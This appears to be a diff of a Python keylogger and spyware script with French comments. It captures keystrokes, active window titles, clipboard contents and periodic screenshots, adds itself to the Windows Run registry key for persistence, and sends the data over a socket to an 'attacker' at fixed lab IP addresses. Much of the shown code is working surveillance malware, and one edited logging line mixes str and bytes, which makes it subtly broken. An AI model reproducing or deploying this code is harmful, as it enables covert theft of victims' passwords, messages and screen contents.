@@ -43,7 +43,6 @@ def connect_to_attacker(ip, port):
         print(f"[-] Échec connexion à l'attaquant : {e}")
         sock = None
 
-
 def envoyer_image(img_data, filename):
     global sock
     if sock is None:
@@ -51,22 +50,23 @@ def envoyer_image(img_data, filename):
         return
 
     try:
-        encrypted_img = fernet.encrypt(img_data)
-        header = f"IMAGE|{filename}|{len(encrypted_img)}".encode()
+        # Envoyer un header simple avec le nom et la taille (longueur)
+        header = f"IMAGE|{filename}|{len(img_data)}".encode()
         sock.sendall(header + b"\n")
-        sock.sendall(encrypted_img)
-        print(f"[+] Image chiffrée envoyée : {filename}")
+
+        # Envoyer l'image en bytes
+        sock.sendall(img_data)
+        print(f"[+] Image envoyée : {filename}")
     except Exception as e:
         print(f"Erreur envoi image : {e}")
-        # Attempt to reconnect
-        connect_to_attacker("192.168.56.102", 9999)
+
 
 def envoyer_log(message):
     global sock
     if sock is None:
         return
     try:
-        encrypted = fernet.encrypt(message.encode())
+        encrypted = fernet.encrypt(message.encode()).decode()
         data = b"LOG|" + encrypted
         sock.sendall(data + b"\n")
     except Exception as e:
@@ -119,16 +119,12 @@ def surveiller_presse_papier():
         time.sleep(0.5)
 
 def get_active_window_title():
-    """Gets the title of the currently active window."""
-    if not WIN32_AVAILABLE:
-        return "[Win32 API Unavailable]"
     try:
-        hwnd = win32gui.GetForegroundWindow()
-        title = win32gui.GetWindowText(hwnd)
-        return title if title else "[No Title]"
-    except Exception as e:
-        logger.error(f"Error getting active window title: {e}")
-        return f"[Error: {e}]"
+        window = win32gui.GetForegroundWindow()
+        return win32gui.GetWindowText(window)
+    except:
+        return "Fenêtre inconnue"
+
 def on_press(key):
     global current_window, log_data
 
@@ -166,7 +162,8 @@ def on_press(key):
             char = f"[{key.name}]"
 
     log_data[current_window][1].append(char)
-    envoyer_touche_immediatement(current_window, char)
+    print(f"{now} | {current_window} > {char}")
+    # envoyer_touche_immediatement(current_window, char)
 def add_registry_persistence():
     """
     Adds the script to Windows startup via HKCU\Run registry key.
@@ -233,11 +230,11 @@ def envoyer_logs_periodiquement():
             print(f"[!] Erreur lors de l'envoi périodique : {e}")
 
         time.sleep(10)  # sommeil fixe entre chaque envoi
-def envoyer_touche_immediatement(window, char):
-    """Send a single keystroke immediately."""
-    now = datetime.now().strftime('%H:%M:%S')
-    message = f"[{now}] {window} > {char}"
-    envoyer_log(message)
+# def envoyer_touche_immediatement(window, char):
+#     """Send a single keystroke immediately."""
+#     now = datetime.now().strftime('%H:%M:%S')
+#     message = f"[{now}] {window} > {char}"
+#     envoyer_log(message)
 def screenshot_thread():
     while True:
         time.sleep(30)  
@@ -250,7 +247,7 @@ if __name__ == "__main__":
     # Connexion à l'attaquant
     add_registry_persistence()
 
-    connect_to_attacker("192.168.56.102", 9999)
+    connect_to_attacker("10.0.2.20", 9999)
     screenshot_t = threading.Thread(target=screenshot_thread, daemon=True)
     screenshot_t.start()
 
@@ -258,8 +255,8 @@ if __name__ == "__main__":
     clipboard_thread = threading.Thread(target=surveiller_presse_papier, daemon=True)
     clipboard_thread.start()
 
-    #log_thread = threading.Thread(target=envoyer_logs_periodiquement, daemon=True)
-    #log_thread.start()
+    log_thread = threading.Thread(target=envoyer_logs_periodiquement, daemon=True)
+    log_thread.start()
 
     # Lancement du keylogger principal
     try:
